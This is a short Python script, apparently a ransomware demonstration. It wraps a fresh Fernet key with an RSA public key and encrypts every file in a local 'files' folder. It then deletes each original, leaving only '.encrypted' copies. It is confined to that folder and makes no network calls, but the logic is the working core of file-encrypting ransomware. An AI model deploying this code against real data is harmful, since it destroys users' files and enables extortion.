#!/usr/bin/env python3

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from cryptography.fernet import Fernet
import os
from pathlib import Path

def encrypt_files():
    os.makedirs('files', exist_ok=True)
    key = Fernet.generate_key()
    fernet = Fernet(key)

    # Encrypt symmetric key with RSA
    pub_key = RSA.import_key(open('keys/public.pem', 'rb').read())
    enc_key = PKCS1_OAEP.new(pub_key).encrypt(key)
    with open('encrypted_key.bin', 'wb') as f:
        f.write(enc_key)

    # Encrypt files
    for file in Path('files').glob('*'):
        if file.suffix == '.encrypted': continue
        data = file.read_bytes()
        encrypted = fernet.encrypt(data)
        file.with_suffix(file.suffix + '.encrypted').write_bytes(encrypted)
        os.remove(file)
        print(f"[✓] Encrypted: {file.name}")

if __name__ == "__main__":
    encrypt_files()
